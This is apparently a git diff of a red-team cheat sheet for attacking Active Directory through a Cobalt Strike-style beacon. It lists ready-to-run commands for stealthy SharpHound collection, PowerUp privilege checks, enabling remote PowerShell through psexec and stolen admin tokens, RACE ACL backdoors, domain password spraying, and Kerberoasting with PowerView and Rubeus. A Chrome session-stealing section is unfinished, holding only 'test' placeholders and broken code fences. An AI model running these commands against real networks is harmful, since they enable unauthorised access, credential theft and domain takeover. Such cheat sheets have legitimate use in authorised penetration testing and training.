@@ -6,34 +6,38 @@
 
 Running PowerView and SharpView
 ```
-PowerView:
-# powershell-import --> Select PowerView.ps1 to import PS1 file in memory
-# powershell Get-Module PowerView
-# powershell Get-NetUser -Identity testuser -Domain lab.com
+# PowerView:
+powershell-import --> Select PowerView.ps1 to import PS1 file in memory
+powershell Get-Module PowerView
+powershell Get-NetUser -Identity testuser -Domain lab.com
 
-SharpView
-# execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
+# SharpView
+execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
 ```
 
 Running ActiveDirectory module
 ```
-# powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
-# powershell Get-ADDomainController -Domain lab.com
+powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
+powershell Get-ADDomainController -Domain lab.com
 ```
 
 Running Sharphound (.NET version of Bloodhound) for AD domain collection
 ```
-Running SharpView in memory (.NET version of PowerView)
-# execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\
+# Running SharpView in memory (.NET version of PowerView)
+execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\
 
-Collecting only user sessions to determine who is logged in and where:
-# execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\
+# Collecting only user sessions to determine who is logged in and where:
+execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\
 
-Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
+# Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
 ```
 ---
 ## Local Privilege Escalation
 PowerUp
+```
+powershell-import --> PowerUp.ps1
+powershell Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
+```
 
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
@@ -41,23 +45,23 @@ Invoke-TheHash
 
 Enable Powershell Remoting manually
 ```
-Enable on local system with Admin privileges
-# powershell Enable-PSRemoting –Force
+# Enable on local system with Admin privileges
+powershell Enable-PSRemoting –Force
 
-Enable on remote system 
-# make_token AD\admin adminpassword --> requires Admin privileges on remote system
-# shell psexec.exe \\TestComputer -h -s powershell.exe Enable-PSRemoting -Force
+# Enable on remote system 
+make_token AD\admin Password123! --> Token with Admin privileges on remote system is required
+shell psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force
 
-Test remote access
-# powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
+# Test remote access
+powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
 ```
 
 [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
 ```
-# powershell-import --> RACE.ps1
-# make_token AD\Admin password --> This tool will require Admin privileges on the remote system
-# powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com
-# powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com
+powershell-import --> RACE.ps1
+make_token AD\Admin password --> This tool will require Admin privileges on the remote system
+powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com --> Force enable PS remoting for the specific user
+powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com --> Force enable WMI for the specific user
 ```
 ------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
@@ -67,46 +71,57 @@ Test remote access
 ### Password spraying
 [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
 ```
-Get a domain user list
-# powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
+powershell-import --> DomainPasswordSpray.ps1
+# Get the full domain user list
+powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
 
-Password spray from a username and password list
-# powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt
+# Password spray from a username and password list
+powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt
 
-Auto spray a specific password on an auto-generated user list (noisy)
-# powershell Invoke-DomainPasswordSpray -Password Winter2020
+# Auto spray a specific password on an auto-generated user list (very noisy)
+powershell Invoke-DomainPasswordSpray -Password Winter2020
 ```
 
 ### Kerberoasting
 PowerView kerberoasting
 ```
-Get users with SPN set
-# powershell Get-DomainUesr -SPN
+# Get users with SPN set
+powershell Get-DomainUesr -SPN
 
-Kerberoast all users
-# powershell Invoke-Kerberoast - OutputFormat hashcat | fl
+# Kerberoast all users
+powershell Invoke-Kerberoast - OutputFormat hashcat | fl
 
-Kerberoast specific user
-# powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
+# Kerberoast specific user
+powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
 ```
 
 Rubeus kerberoasting
 ```
-Kerberoast all users
-# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com
+# Kerberoast all users
+execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com
 
-Kerberoast specific user
-# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
+# Kerberoast specific user
+execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
 ```
 
 ------------------------------------------------------------------------------------------
 ## Exploitation
 
 ### Chrome Session Stealing
-SharpDPAPI and SharpChrome (require DA privileges)
+SharpDPAPI to dump domain master key (requires DA privileges)
+````
+test
+```
 
-Dumping Chrome login passwords
-- SharpChrome
+SharpChrome - test
+```
+# Dumping Chrome login passwords on remote machines
+
+
+# Dumping and decryptiong Chrome user sessions on remote machines
+
+```
+
 
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
